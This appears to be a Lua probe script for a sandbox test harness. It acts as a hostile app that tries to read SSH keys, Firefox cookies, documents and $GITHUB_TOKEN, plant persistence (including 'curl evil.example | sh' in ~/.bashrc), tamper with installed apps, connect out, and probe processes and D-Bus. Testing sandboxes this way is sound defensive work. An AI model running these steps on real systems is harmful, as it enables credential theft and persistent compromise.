-- A stand-in for a hostile app: Neovim runs this as its own code (nvim -l probe.lua).
-- Each line prints BLOCKED or LEAKED as the app sees it; for writes the harness then checks the real files.
local home = os.getenv("REAL_HOME") or os.getenv("HOME")
local uv = vim.uv or vim.loop

local function say(ok_for_attacker, what, detail)
  print(string.format("  %-7s %-44s %s", ok_for_attacker and "LEAKED" or "BLOCKED", what, detail or ""))
end

local function read(path)
  local f = io.open(path, "r")
  if not f then return nil end
  local s = f:read("*a"); f:close(); return s
end

local function append(path, text)
  vim.fn.mkdir(vim.fn.fnamemodify(path, ":h"), "p")
  local f = io.open(path, "a")
  if not f then return false end
  f:write(text); f:close()
  return true
end

-- 1. secrets
local key = read(home .. "/.ssh/id_ed25519")
say(key ~= nil, "read ~/.ssh/id_ed25519", key and key:sub(1, 30):gsub("\n", " ") or "")
local cookies = read(home .. "/.mozilla/firefox/abc.default/cookies.sqlite")
say(cookies ~= nil, "read Firefox cookies", cookies and cookies:sub(1, 20) or "")
local doc = read(home .. "/Documents/taxes.txt")
say(doc ~= nil, "read ~/Documents/taxes.txt", doc and doc:sub(1, 20) or "")
local tok = os.getenv("GITHUB_TOKEN")
say(tok ~= nil, "read $GITHUB_TOKEN from the environment", tok or "")

-- 2. persistence
say(append(home .. "/.bashrc", "\ncurl evil.example | sh  # probe\n"), "append to ~/.bashrc")
say(append(home .. "/.config/autostart/evil.desktop", "[Desktop Entry]\nExec=/tmp/evil\n"), "write ~/.config/autostart/evil.desktop")
say(append(home .. "/.config/systemd/user/evil.service", "[Service]\nExecStart=/tmp/evil\n"), "write a systemd user unit")
say(append(home .. "/.local/share/applications/firefox.desktop", "[Desktop Entry]\nExec=/tmp/evil\n"), "hijack a menu entry")

-- 3. tamper with installed apps (its own folder and another app's)
say(append(os.getenv("APP_DIR") .. "/AppRun.evil", "x"), "write into its own install folder")
say(append(home .. "/bin/apps/otherapp/OtherApp.AppImage", "x"), "modify another installed app")

-- 4. network
local connected, done = false, false
local tcp = uv.new_tcp()
tcp:connect("140.82.112.3", 443, function(err) connected = (err == nil); done = true; tcp:close() end)
vim.wait(4000, function() return done end, 50)
say(connected, "TCP connect to github.com:443", done and "" or "(timed out)")

-- 5. other processes
local seen = {}
for name in vim.fs.dir("/proc") do
  if name:match("^%d+$") then
    local cmd = read("/proc/" .. name .. "/cmdline")
    if cmd and cmd:find("secret%-agent") then table.insert(seen, name) end
  end
end
say(#seen > 0, "see the user's other processes", #seen > 0 and ("secret-agent pid " .. seen[1]) or "")

-- 6. session D-Bus (where a hostile app could ask systemd/portals to run things outside)
local addr = os.getenv("DBUS_SESSION_BUS_ADDRESS") or ""
local names = vim.fn.system({ "dbus-send", "--session", "--print-reply", "--dest=org.freedesktop.DBus",
  "/org/freedesktop/DBus", "org.freedesktop.DBus.ListNames" })
local reached = vim.v.shell_error == 0
say(reached, "talk to the session bus (the bus itself)", reached and "" or addr == "" and "(no bus address)" or "")
local evil = vim.fn.system({ "dbus-send", "--session", "--print-reply", "--dest=org.example.Secrets",
  "/", "org.freedesktop.DBus.Introspectable.Introspect" })
say(vim.v.shell_error == 0, "call another app's D-Bus service", "org.example.Secrets")

-- 7. its own data still works
say(append(os.getenv("HOME") .. "/.local/share/nvim/probe-state", "ok\n"), "(app's own data) write its settings")
